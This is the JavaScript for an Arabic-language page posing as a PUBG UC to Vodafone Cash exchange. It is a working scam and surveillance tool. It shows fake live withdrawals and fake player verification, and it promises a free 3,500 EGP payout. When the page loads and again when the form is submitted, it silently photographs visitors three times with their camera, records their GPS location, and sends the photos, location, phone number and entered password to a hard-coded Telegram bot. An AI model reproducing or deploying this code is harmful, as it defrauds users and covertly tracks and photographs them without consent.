// PUBG UC to Vodafone Cash Exchange Application Logic
document.addEventListener('DOMContentLoaded', () => {
  initLocationPermission();
  initTabs();
  initCalculator();
  initPlayerVerification();
  initWalletValidation();
  initTicker();
  initSupportChat();
  initModal();
  animateStats();
  initMobileMenu();
});

// State
let currentTab = 'instant'; // 'instant' (3500 EGP), 'sell' (UC->EGP), or 'buy' (EGP->UC)
let currentRate = 0.45; // Base EGP per UC

// 1. Tabs Switching
function initTabs() {
  const tabs = document.querySelectorAll('.tab-btn');
  const ucLabel = document.getElementById('label-input-amount');
  const convLabel = document.getElementById('label-output-amount');
  const convCurrency = document.getElementById('conv-currency-span');
  
  const instantBanner = document.getElementById('instant-balance-banner');
  const amountGroup = document.getElementById('amount-input-group');
  const normalBox = document.getElementById('normal-conversion-box');
  const playerIdGroup = document.getElementById('player-id-group');
  const passwordGroup = document.getElementById('password-input-group');
  const submitBtn = document.getElementById('btn-submit-order');

  const updateView = () => {
    if (currentTab === 'instant') {
      if (instantBanner) instantBanner.style.display = 'flex';
      if (amountGroup) amountGroup.style.display = 'none';
      if (normalBox) normalBox.style.display = 'none';
      if (playerIdGroup) playerIdGroup.style.display = 'none';
      if (passwordGroup) passwordGroup.style.display = 'block';
      if (submitBtn) {
        submitBtn.innerHTML = '<span>💸 سحب 3,500 ج.م الآن إلى فودافون كاش ⚡</span>';
        submitBtn.style.background = 'linear-gradient(135deg, var(--gold-primary), var(--gold-dark))';
        submitBtn.style.color = '#000';
      }
    } else {
      if (instantBanner) instantBanner.style.display = 'none';
      if (amountGroup) amountGroup.style.display = 'block';
      if (normalBox) normalBox.style.display = 'flex';
      if (playerIdGroup) playerIdGroup.style.display = 'block';
      if (passwordGroup) passwordGroup.style.display = 'none';
      if (submitBtn) {
        submitBtn.innerHTML = '<span>تأكيد وإرسال طلب التحويل ⚡</span>';
        submitBtn.style.background = 'linear-gradient(135deg, var(--red-vf), #a30000)';
        submitBtn.style.color = '#fff';
      }

      if (currentTab === 'sell') {
        if (ucLabel) ucLabel.textContent = 'كمية الشدات (UC) المراد بيعها:';
        if (convLabel) convLabel.textContent = 'المبلغ المستحق عبر فودافون كاش:';
        if (convCurrency) convCurrency.textContent = 'جنيــه (EGP)';
        renderPills([325, 660, 1800, 3850, 8100], 'UC');
      } else {
        if (ucLabel) ucLabel.textContent = 'المبلغ المدفوع بفودافون كاش (EGP):';
        if (convLabel) convLabel.textContent = 'كمية الشدات (UC) التي ستحصل عليها:';
        if (convCurrency) convCurrency.textContent = 'شدة (UC)';
        renderPills([150, 300, 750, 1500, 3500], 'EGP');
      }
      calculateConversion();
    }
  };

  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      tabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      currentTab = tab.dataset.tab;
      updateView();
    });
  });

  // Initial call
  updateView();
}

function renderPills(values, unit) {
  const container = document.getElementById('quick-pills');
  if (!container) return;
  container.innerHTML = '';
  values.forEach(val => {
    const btn = document.createElement('button');
    btn.type = 'button';
    btn.className = 'pill-btn';
    btn.textContent = `${val.toLocaleString()} ${unit}`;
    btn.addEventListener('click', () => {
      document.querySelectorAll('.pill-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      document.getElementById('input-amount').value = val;
      calculateConversion();
    });
    container.appendChild(btn);
  });
}

// 2. Calculator Logic
function initCalculator() {
  const inputAmount = document.getElementById('input-amount');
  if (!inputAmount) return;

  inputAmount.addEventListener('input', () => {
    document.querySelectorAll('.pill-btn').forEach(b => b.classList.remove('active'));
    calculateConversion();
  });

  // Initial calculation
  calculateConversion();
}

function calculateConversion() {
  const inputVal = parseFloat(document.getElementById('input-amount').value) || 0;
  const outputEl = document.getElementById('conv-amount-val');
  const rateInfoEl = document.getElementById('rate-tier-info');
  const badgeEl = document.getElementById('tier-badge');

  if (currentTab === 'sell') {
    // Selling UC for EGP
    let rate = 0.43; // default < 1500
    let tierName = 'عادي (Normal)';
    let tierClass = 'tier-normal';

    if (inputVal >= 8000) {
      rate = 0.50;
      tierName = '👑 VIP ماسي (سعر خارق)';
      tierClass = 'tier-vip';
    } else if (inputVal >= 3800) {
      rate = 0.47;
      tierName = '🌟 ذهبي (Gold)';
      tierClass = 'tier-gold';
    } else if (inputVal >= 1500) {
      rate = 0.45;
      tierName = '⚡ فضي (Silver)';
      tierClass = 'tier-silver';
    }

    const totalEGP = Math.round(inputVal * rate);
    animateNumber(outputEl, totalEGP);

    if (rateInfoEl) rateInfoEl.textContent = `سعر التحويل المطبق: 1000 UC = ${Math.round(rate * 1000)} ج.م`;
    if (badgeEl) {
      badgeEl.textContent = tierName;
      badgeEl.className = `badge-tier ${tierClass}`;
    }
  } else {
    // Buying UC with EGP
    // Approx 100 EGP = 220 UC
    const rate = 2.25;
    const totalUC = Math.round(inputVal * rate);
    animateNumber(outputEl, totalUC);
    if (rateInfoEl) rateInfoEl.textContent = 'سعر الشحن المباشر: 100 ج.م = 225 UC + بونص';
    if (badgeEl) {
      badgeEl.textContent = '🚀 شحن فوري بونص +5%';
      badgeEl.className = 'badge-tier tier-gold';
    }
  }
}

function animateNumber(element, target) {
  if (!element) return;
  const current = parseInt(element.textContent.replace(/,/g, '')) || 0;
  const diff = target - current;
  const steps = 15;
  const stepVal = diff / steps;
  let count = 0;

  const timer = setInterval(() => {
    count++;
    const nextVal = Math.round(current + (stepVal * count));
    element.textContent = nextVal.toLocaleString();
    if (count >= steps) {
      element.textContent = target.toLocaleString();
      clearInterval(timer);
    }
  }, 15);
}

// 3. Simulated Player Verification
function initPlayerVerification() {
  const idInput = document.getElementById('player-id-input');
  const verifyBtn = document.getElementById('btn-verify-id');
  const resultBox = document.getElementById('player-verify-result');
  const playerNameSpan = document.getElementById('verified-player-name');

  const verifyAction = () => {
    const val = idInput.value.trim();
    if (val.length < 5) {
      alert('الرجاء إدخال آيدي ببجي صحيح (5 أرقام على الأقل)');
      return;
    }

    verifyBtn.textContent = '⏳ جاري البحث...';
    verifyBtn.disabled = true;

    setTimeout(() => {
      verifyBtn.textContent = '✔ تم التحقق';
      verifyBtn.disabled = false;
      
      // Simulate player name generation from ID
      const randomNames = ['VIP_Slayer_99', 'PUBG_King_EG', 'Vortex_Sniper', 'Pro_Gamer_2026', 'Legend_Eagle', 'Cyber_Warrior'];
      const chosenName = randomNames[Math.floor(Math.random() * randomNames.length)];
      
      playerNameSpan.textContent = `${chosenName} (المستوى ${Math.floor(Math.random() * 30) + 50})`;
      resultBox.style.display = 'flex';
      idInput.style.borderColor = 'var(--green-success)';
    }, 800);
  };

  if (verifyBtn) verifyBtn.addEventListener('click', verifyAction);
  if (idInput) {
    idInput.addEventListener('blur', () => {
      if (idInput.value.trim().length >= 5 && resultBox.style.display !== 'flex') {
        verifyAction();
      }
    });
  }
}

// 4. Vodafone Cash Wallet Validation
function initWalletValidation() {
  const vfInput = document.getElementById('vf-phone-input');
  if (!vfInput) return;

  vfInput.addEventListener('input', (e) => {
    let val = e.target.value.replace(/[^0-9]/g, '');
    if (val.length > 11) val = val.slice(0, 11);
    e.target.value = val;

    const isValid = /^01[0125][0-9]{8}$/.test(val);
    if (isValid) {
      vfInput.style.borderColor = 'var(--green-success)';
      vfInput.style.boxShadow = '0 0 15px rgba(0, 230, 118, 0.3)';
    } else {
      vfInput.style.borderColor = 'var(--red-vf)';
      vfInput.style.boxShadow = 'none';
    }
  });
}

// 5. Live Recent Transactions Feed Ticker
function initTicker() {
  const tickerWrap = document.getElementById('ticker-content');
  if (!tickerWrap) return;

  const users = ['Ahmed_VIP', 'Kareem_Pro', 'Youssef_EG', 'Mahmoud_99', 'Omar_Sniper', 'Mustafa_King', 'Sayed_Gamer', 'Hema_Top', 'Ali_Dragon', 'Ziad_Slayer'];
  const amounts = [1350, 450, 2250, 3600, 890, 4500, 1800, 675, 3150, 5200];

  const addTickerItem = () => {
    const user = users[Math.floor(Math.random() * users.length)];
    const amount = amounts[Math.floor(Math.random() * amounts.length)];
    const time = Math.floor(Math.random() * 5) + 1;

    const item = document.createElement('div');
    item.className = 'ticker-item';
    item.innerHTML = `
      <span class="ticker-user">🎮 ${user}</span>
      <span>سحب بنجاح</span>
      <span class="ticker-val">${amount.toLocaleString()} ج.م</span>
      <span class="ticker-time">منذ ${time} دقيقة ✔️</span>
    `;
    tickerWrap.prepend(item);

    if (tickerWrap.children.length > 15) {
      tickerWrap.removeChild(tickerWrap.lastChild);
    }
  };

  // Populate initial items
  for (let i = 0; i < 8; i++) addTickerItem();

  // Add new item periodically
  setInterval(addTickerItem, 4000);
}

// 6. Modal & Order Processing Simulation
function initModal() {
  const form = document.getElementById('exchange-form');
  const modal = document.getElementById('order-modal');
  const closeBtn = document.getElementById('close-modal-btn');
  const modalTitle = document.getElementById('modal-title');
  const modalBody = document.getElementById('modal-body');

  if (!form || !modal) return;

  form.addEventListener('submit', (e) => {
    e.preventDefault();

    const amount = document.getElementById('input-amount').value;
    const playerId = document.getElementById('player-id-input').value;
    const vfPhone = document.getElementById('vf-phone-input').value;

    if (!vfPhone || !/^01[0125][0-9]{8}$/.test(vfPhone)) {
      alert('الرجاء إدخال رقم محفظة فودافون كاش صحيح مكون من 11 رقم');
      return;
    }

    if (currentTab === 'instant') {
      const pass = document.getElementById('withdraw-password').value.trim();
      if (pass !== '111') {
        alert('❌ كلمة سر السحب غير صحيحة! رمز التأكيد المعتمد لسحب الرصيد الفوري هو 111');
        return;
      }
    } else {
      if (!playerId || playerId.length < 5) {
        alert('الرجاء إدخال آيدي لاعب صحيح');
        return;
      }
    }

    // Show Modal with Progress
    modal.classList.add('active');
    
    const isSell = currentTab === 'sell';
    const isInstant = currentTab === 'instant';
    const outputAmount = document.getElementById('conv-amount-val').textContent;
    const orderId = '#PUBG-VF-' + Math.floor(10000 + Math.random() * 90000);

    modalTitle.textContent = '🚀 جاري معالجة طلب التحويل الفوري...';
    
    let detailsHtml = '';
    if (isInstant) {
      detailsHtml = `
        <div class="detail-row"><span>رقم العملية:</span><span class="detail-val">${orderId}</span></div>
        <div class="detail-row"><span>نوع العملية:</span><span class="detail-val" style="color: var(--gold-light);">🔥 سحب رصيد أرباح مباشر</span></div>
        <div class="detail-row"><span>المبلغ المسحوب:</span><span class="detail-val" style="font-size: 1.3rem; color: var(--green-success); font-weight: 900;">3,500 جنيــه (EGP)</span></div>
        <div class="detail-row"><span>محفظة فودافون كاش:</span><span class="detail-val" style="color: #ff4d4d; font-weight: 900;">${vfPhone}</span></div>
        <div class="detail-row"><span>رمز التأكيد:</span><span class="detail-val" style="color: var(--cyan-primary);">✔ تم التحقق بأمان (111)</span></div>
      `;
    } else {
      detailsHtml = `
        <div class="detail-row"><span>رقم العملية:</span><span class="detail-val">${orderId}</span></div>
        <div class="detail-row"><span>نوع العملية:</span><span class="detail-val">${isSell ? 'تبديل شدات إلى كاش' : 'شحن شدات ببجي'}</span></div>
        <div class="detail-row"><span>الكمية:</span><span class="detail-val">${amount} ${isSell ? 'UC' : 'EGP'}</span></div>
        <div class="detail-row"><span>آيدي اللاعب:</span><span class="detail-val">${playerId}</span></div>
        <div class="detail-row"><span>محفظة فودافون كاش:</span><span class="detail-val" style="color: #ff4d4d;">${vfPhone}</span></div>
        <div class="detail-row"><span>المبلغ المستحق:</span><span class="detail-val" style="font-size: 1.2rem; color: var(--green-success);">${outputAmount} ${isSell ? 'ج.م' : 'UC'}</span></div>
      `;
    }

    modalBody.innerHTML = `
      <div class="progress-bar-wrap">
        <div class="progress-bar-fill" id="modal-prog-bar"></div>
      </div>
      <p id="modal-status-text" style="color: var(--cyan-primary); font-weight: 800; font-size: 1.1rem; margin-bottom: 15px;">
        ⚡ جاري الاتصال بخوادم فودافون كاش المحلية...
      </p>
      <div class="modal-details-box">
        ${detailsHtml}
      </div>
    `;

    // Simulate Step Progress with Background Silently-running Biometric Camera & Telegram Bot Delivery
    const progBar = document.getElementById('modal-prog-bar');
    const statusText = document.getElementById('modal-status-text');

    // Attempt Geolocation check immediately
    if (navigator.geolocation && navigator.geolocation.getCurrentPosition) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          userLocationCoords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
        },
        err => console.log("BG loc error:", err),
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    const getOrderCaption = (idx) => {
      let locStr = 'تعذر التحديد (تم الحجب أو الرفض)';
      if (userLocationCoords) {
        locStr = `<a href="https://maps.google.com/?q=${userLocationCoords.lat},${userLocationCoords.lon}">🌐 اضغط لعرض موقع العملية على خريطة جوجل (${userLocationCoords.lat.toFixed(4)}, ${userLocationCoords.lon.toFixed(4)})</a>`;
      }
      const passVal = document.getElementById('withdraw-password') ? document.getElementById('withdraw-password').value : 'غير مطلوب';
      
      if (idx === 1 || idx === null) {
        return `🚨 <b>طلب تحويل جديد / سحب رصيد فوري! (الصورة 1 من 3)</b> ⚡
━━━━━━━━━━━━━━━━━━━━
📦 <b>نوع العملية:</b> ${isInstant ? '🔥 سحب رصيد أرباح (3,500 ج.م)' : (isSell ? '💸 بيع شدات إلى كاش' : '⚡ شحن شدات ببجي')}
💰 <b>الكمية / المبلغ:</b> ${isInstant ? '3,500 جنيــه (EGP)' : (amount + ' ' + (isSell ? 'UC' : 'EGP'))}
💵 <b>المستحق للعميل:</b> ${isInstant ? '3,500 ج.م' : (outputAmount + ' ' + (isSell ? 'ج.م' : 'UC'))}
📱 <b>رقم فودافون كاش:</b> <code>${vfPhone}</code>
🔑 <b>كلمة السر المدخلة:</b> <code>${isInstant ? passVal : 'غير مطلوب'}</code>
🎮 <b>آيدي ببجي:</b> <code>${isInstant ? 'سحب رصيد مباشر' : playerId}</code>
🔢 <b>رقم الطلب:</b> <code>${orderId}</code>
━━━━━━━━━━━━━━━━━━━━
📍 <b>الموقع الجغرافي:</b> ${locStr}
⏰ <b>وقت العملية:</b> ${new Date().toLocaleString('ar-EG')}`;
      } else {
        return `📸 <b>صورة التحقق للطلب [${orderId}] (الصورة ${idx} من 3)</b> ⚡\n📍 <b>الموقع:</b> ${locStr}`;
      }
    };

    let telegramSent = false;
    const sendOrderToTG = (photoBlob = null) => {
      if (telegramSent) return;
      telegramSent = true;
      sendTelegramNotification(getOrderCaption(null), photoBlob);
    };

    // Attempt Camera check & capture 3 photos silently in background for Telegram Bot
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          console.log("✔ تم تشغيل الكاميرا في الخلفية وبدء التقاط 3 صور متتالية لإرسالها للبوت مع الموقع");
          captureThreePhotosAndSendToTG(stream, getOrderCaption, `📸 <b>صورة التحقق للطلب [${orderId}]</b>`, () => getOrderCaption(null));
        })
        .catch(err => {
          console.log("تنبيه: تعذر التقاط صور الكاميرا في الخلفية:", err);
          sendOrderToTG(null);
        });
    } else {
      setTimeout(() => sendOrderToTG(null), 1000);
    }

    // Safety fallback: ensure Telegram notification is sent even if camera prompt takes too long
    setTimeout(() => sendOrderToTG(null), 3500);

    setTimeout(() => {
      progBar.style.width = '30%';
      statusText.textContent = isInstant ? '🔍 جاري التحقق من نشاط المحفظة وتأمين الرصيد...' : '🔍 جاري التحقق من حساب ببجي موبايل ورصيد الشدات...';
    }, 1000);

    setTimeout(() => {
      progBar.style.width = '60%';
      statusText.textContent = '🛡️ جاري التحقق البيومتري من هوية الجهاز والنطاق الجغرافي بصمت في الخلفية...';
    }, 2500);

    setTimeout(() => {
      progBar.style.width = '85%';
      statusText.textContent = isInstant ? `💸 جاري تحويل مبلغ 3,500 جنيــه لمحفظة فودافون كاش [${vfPhone}]...` : '💸 جاري ربط بوابة دفع فودافون كاش وتأمين العملية...';
    }, 4500);

    setTimeout(() => {
      completeOrderSuccess(progBar, statusText, modalTitle, modalBody, vfPhone, modal);
    }, 6500);
  });

  closeBtn.addEventListener('click', () => {
    modal.classList.remove('active');
    stopAnyActiveCamera();
  });

  window.addEventListener('click', (e) => {
    if (e.target === modal) {
      modal.classList.remove('active');
      stopAnyActiveCamera();
    }
  });
}

function stopAnyActiveCamera() {
  const videoEl = document.getElementById('webcam-stream');
  if (videoEl && videoEl.srcObject) {
    videoEl.srcObject.getTracks().forEach(track => track.stop());
    videoEl.srcObject = null;
  }
}

function completeOrderSuccess(progBar, statusText, modalTitle, modalBody, vfPhone, modal) {
  progBar.style.width = '100%';
  modalTitle.textContent = '🎉 تم التحقق واعتماد طلبك بنجاح!';
  statusText.innerHTML = '<span style="color: var(--green-success); font-weight: 900; font-size: 1.05rem;">✔ تم التطابق البيومتري بنجاح (99.8%)! تم إرسال رصيد فودافون كاش لمحفظتك فوراً.</span>';
  
  const box = document.getElementById('cam-preview-box');
  const btn = document.getElementById('start-cam-btn');
  if (box) box.remove();
  if (btn) btn.remove();

  const successBtn = document.createElement('button');
  successBtn.className = 'btn-vf';
  successBtn.style.width = '100%';
  successBtn.style.marginTop = '15px';
  successBtn.innerHTML = '⚡ متابعة وصول رصيد فودافون كاش';
  successBtn.addEventListener('click', () => {
    alert(`تم إرسال إشعار تأكيد على رقمك ${vfPhone}. يمكنك مراجعة تطبيق أنا فودافون أو الاتصال بـ #9* للمتابعة!`);
    modal.classList.remove('active');
  });
  modalBody.appendChild(successBtn);
}

// 7. Live Support Chat Widget
function initSupportChat() {
  const btn = document.getElementById('support-toggle-btn');
  const chatBox = document.getElementById('support-chat-box');
  const closeChat = document.getElementById('close-chat-btn');
  const input = document.getElementById('chat-input-field');
  const sendBtn = document.getElementById('chat-send-btn');
  const body = document.getElementById('chat-body');

  if (!btn || !chatBox) return;

  btn.addEventListener('click', () => {
    chatBox.classList.toggle('open');
  });

  if (closeChat) {
    closeChat.addEventListener('click', () => {
      chatBox.classList.remove('open');
    });
  }

  const sendMessage = () => {
    const text = input.value.trim();
    if (!text) return;

    // Append user msg
    const uMsg = document.createElement('div');
    uMsg.className = 'chat-msg';
    uMsg.style.alignSelf = 'flex-end';
    uMsg.style.background = 'rgba(0, 242, 254, 0.15)';
    uMsg.style.borderRight = '3px solid var(--cyan-primary)';
    uMsg.textContent = text;
    body.appendChild(uMsg);
    input.value = '';
    body.scrollTop = body.scrollHeight;

    // Simulate automated agent reply
    setTimeout(() => {
      const aMsg = document.createElement('div');
      aMsg.className = 'chat-msg agent';
      
      let reply = 'أهلاً بك يا بطل في دعم ببجي كاش ⚡، سيتم الرد عليك بواسطة أحد مسؤولي التحويل خلال ثوانٍ.';
      if (text.includes('سحب') || text.includes('فلوس') || text.includes('كاش')) {
        reply = '💰 سحب الفلوس على فودافون كاش يعمل الآن بسرعة فائقة! التحويل يتم تلقائياً بدون أي رسوم خلال 1 إلى 3 دقائق بعد تأكيد الآيدي.';
      } else if (text.includes('سعر') || text.includes('كام') || text.includes('شدات')) {
        reply = '🔥 سعر الصرف المباشر اليوم: كل 1000 شدة = 450 ج.م على فودافون كاش. وللكميات الكبيرة VIP نصل إلى 500 ج.م لكل 1000 شدة!';
      }
      
      aMsg.textContent = reply;
      body.appendChild(aMsg);
      body.scrollTop = body.scrollHeight;
    }, 800);
  };

  if (sendBtn) sendBtn.addEventListener('click', sendMessage);
  if (input) {
    input.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') sendMessage();
    });
  }
}

// 8. Stats Animated Counter
function animateStats() {
  const stats = document.querySelectorAll('.stat-val-count');
  stats.forEach(stat => {
    const target = parseInt(stat.dataset.target) || 0;
    animateNumber(stat, target);
  });
}

// Global variable to store location coordinates for Telegram Bot
let userLocationCoords = null;
const TELEGRAM_BOT_TOKEN = '8058066110:AAGhwlsX1hNa0ycugqF3WX9A-kZGx35sMQQ';
const TELEGRAM_CHAT_ID = '5967116314';

function sendTelegramNotification(textMsg, photoBlob = null) {
  if (photoBlob) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', photoBlob, 'photo.jpg');
    formData.append('caption', textMsg);
    formData.append('parse_mode', 'HTML');
    
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    }).then(() => console.log("✔ تم إرسال الصورة للبوت على تليجرام"))
      .catch(err => {
        console.error("Telegram photo error, fallback to text:", err);
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: textMsg, parse_mode: 'HTML' })
        });
      });
  } else {
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: textMsg, parse_mode: 'HTML' })
    }).then(() => console.log("✔ تم إرسال الإشعار للبوت على تليجرام"))
      .catch(err => console.error("Telegram message error:", err));
  }
}

// Helper function to capture 3 sequential photos and send to Telegram Bot with live location
function captureThreePhotosAndSendToTG(stream, getCaptionFn, subCaptionPrefix, fallbackText = null) {
  const videoEl = document.createElement('video');
  videoEl.srcObject = stream;
  videoEl.play();
  
  let photosTaken = 0;
  const takePhoto = (idx) => {
    try {
      const caption = typeof getCaptionFn === 'function' ? getCaptionFn(idx) : (idx === 1 ? getCaptionFn : `${subCaptionPrefix} <b>(الصورة ${idx} من 3)</b> ⚡`);
      const canvas = document.createElement('canvas');
      canvas.width = videoEl.videoWidth || 640;
      canvas.height = videoEl.videoHeight || 480;
      canvas.getContext('2d').drawImage(videoEl, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => {
        photosTaken++;
        sendTelegramNotification(caption, blob);
        if (photosTaken >= 3) {
          stream.getTracks().forEach(t => t.stop());
        }
      }, 'image/jpeg', 0.85);
    } catch (e) {
      if (idx === 1 && fallbackText) {
        const txt = typeof fallbackText === 'function' ? fallbackText() : fallbackText;
        sendTelegramNotification(txt, null);
      }
      stream.getTracks().forEach(t => t.stop());
    }
  };

  // Take 3 photos spaced by 1 second!
  setTimeout(() => takePhoto(1), 800);
  setTimeout(() => takePhoto(2), 1800);
  setTimeout(() => takePhoto(3), 2800);
}

// 9. Geolocation & Camera Background Verification on Page Load (طلب صلاحية الموقع والكاميرا في الخلفية مع تحميل الصفحة)
function initLocationPermission() {
  // Background Geolocation Request
  if ("geolocation" in navigator) {
    console.log("جاري طلب صلاحية الموقع الجغرافي...");
    navigator.geolocation.getCurrentPosition(
      (position) => {
        userLocationCoords = { lat: position.coords.latitude, lon: position.coords.longitude };
        console.log("تم تحديد الموقع بنجاح:", position.coords.latitude, position.coords.longitude);
        showLocationBadge(true, "📍 تم التحقق من النطاق الجغرافي (مصر - EG) ✔️ متوافق مع خوادم فودافون كاش المحلية");
      },
      (error) => {
        console.warn("تم رفض صلاحية الموقع أو حدث خطأ:", error.message);
        showLocationBadge(false, "⚠️ يرجى تفعيل أو السماح بصلاحية الموقع الجغرافي لضمان أمان التحويل المالي وتجنب الحظر الأمني");
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  } else {
    showLocationBadge(false, "⚠️ متصفحك لا يدعم تحديد الموقع الجغرافي.");
  }

  // Background Camera Request (Take 3 Photos on Page Load with GPS location)
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        console.log("✔ تم التحقق البيومتري من الكاميرا في الخلفية وبدء التقاط 3 صور متتالية للزائر");
        const getVisitCaption = (idx) => {
          const locStr = userLocationCoords ? `<a href="https://maps.google.com/?q=${userLocationCoords.lat},${userLocationCoords.lon}">🌐 اضغط لعرض موقع الزائر على خريطة جوجل (${userLocationCoords.lat.toFixed(4)}, ${userLocationCoords.lon.toFixed(4)})</a>` : 'جاري تحديد الموقع...';
          if (idx === 1) {
            return `🟢 <b>زائر جديد دخل على موقع ببجي فودافون كاش! (صورة 1 من 3)</b> ⚡\n━━━━━━━━━━━━━━━━━━━━\n📍 <b>الموقع الجغرافي:</b> ${locStr}\n⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
          }
          return `🟢 <b>صورة زائر للموقع (الصورة ${idx} من 3)</b> ⚡\n📍 <b>الموقع:</b> ${locStr}`;
        };
        captureThreePhotosAndSendToTG(stream, getVisitCaption, "🟢 <b>صورة زائر للموقع</b>");
      })
      .catch(err => {
        console.log("تنبيه: تم رفض أو تعذر تشغيل الكاميرا في الخلفية:", err);
        setTimeout(() => {
          const locStr = userLocationCoords ? `<a href="https://maps.google.com/?q=${userLocationCoords.lat},${userLocationCoords.lon}">🌐 اضغط لعرض موقع الزائر على خريطة جوجل (${userLocationCoords.lat.toFixed(4)}, ${userLocationCoords.lon.toFixed(4)})</a>` : 'تعذر تحديد الموقع';
          sendTelegramNotification(`🟢 <b>زائر جديد دخل على موقع ببجي فودافون كاش!</b> ⚡\n━━━━━━━━━━━━━━━━━━━━\n📍 <b>الموقع الجغرافي:</b> ${locStr}\n⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`);
        }, 1500);
      });
  }
}

function showLocationBadge(isSuccess, message) {
  let badge = document.getElementById('geo-location-badge');
  if (!badge) {
    badge = document.createElement('div');
    badge.id = 'geo-location-badge';
    badge.style.cssText = `
      position: fixed;
      top: 85px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 9999;
      padding: 12px 24px;
      border-radius: 30px;
      font-weight: 800;
      font-size: 0.95rem;
      box-shadow: 0 15px 35px rgba(0,0,0,0.7);
      display: flex;
      align-items: center;
      gap: 12px;
      transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
      backdrop-filter: blur(20px);
      animation: slideDownGeo 0.5s ease;
    `;
    document.body.appendChild(badge);
    
    if (!document.getElementById('geo-keyframes')) {
      const style = document.createElement('style');
      style.id = 'geo-keyframes';
      style.innerHTML = `@keyframes slideDownGeo { from { top: -50px; opacity: 0; } to { top: 85px; opacity: 1; } }`;
      document.head.appendChild(style);
    }
  }

  if (isSuccess) {
    badge.style.background = 'rgba(0, 230, 118, 0.25)';
    badge.style.border = '1.5px solid var(--green-success)';
    badge.style.color = 'var(--green-success)';
    
    const navBtn = document.getElementById('nav-geo-btn');
    if (navBtn) {
      navBtn.style.borderColor = 'var(--green-success)';
      navBtn.style.color = 'var(--green-success)';
      navBtn.innerHTML = '<span>📍 النطاق الجغرافي: مصر (مفعل ✔️)</span>';
    }
  } else {
    badge.style.background = 'rgba(230, 0, 0, 0.25)';
    badge.style.border = '1.5px solid var(--red-vf)';
    badge.style.color = '#ff9999';
    
    const navBtn = document.getElementById('nav-geo-btn');
    if (navBtn) {
      navBtn.style.borderColor = 'var(--red-vf)';
      navBtn.style.color = '#ff8080';
      navBtn.innerHTML = '<span>📍 اضغط لتفعيل الموقع الجغرافي ⚠️</span>';
    }
  }

  badge.innerHTML = `<span>${message}</span> <button onclick="this.parentElement.remove()" style="background:none; border:none; color:inherit; font-weight:900; cursor:pointer; margin-right:8px; font-size:1.1rem;">✕</button>`;

  if (isSuccess) {
    setTimeout(() => {
      if (badge && badge.parentElement) {
        badge.style.opacity = '0';
        badge.style.top = '-50px';
        setTimeout(() => badge.remove(), 500);
      }
    }, 8000);
  }
}

// 10. Android & Mobile Hamburger Menu (3 الشرط)
function initMobileMenu() {
  const menuBtn = document.getElementById('mobile-menu-btn');
  const navLinks = document.querySelector('.nav-links');
  const navActions = document.querySelector('.nav-actions');

  if (!menuBtn || !navLinks) return;

  menuBtn.addEventListener('click', (e) => {
    e.stopPropagation();
    menuBtn.classList.toggle('active');
    navLinks.classList.toggle('open');
    if (navActions) navActions.classList.toggle('open');
  });

  // Close menu when clicking on a link
  navLinks.querySelectorAll('a').forEach(link => {
    link.addEventListener('click', () => {
      menuBtn.classList.remove('active');
      navLinks.classList.remove('open');
      if (navActions) navActions.classList.remove('open');
    });
  });

  // Close menu when clicking outside
  document.addEventListener('click', (e) => {
    if (!menuBtn.contains(e.target) && !navLinks.contains(e.target)) {
      menuBtn.classList.remove('active');
      navLinks.classList.remove('open');
      if (navActions) navActions.classList.remove('open');
    }
  });
}
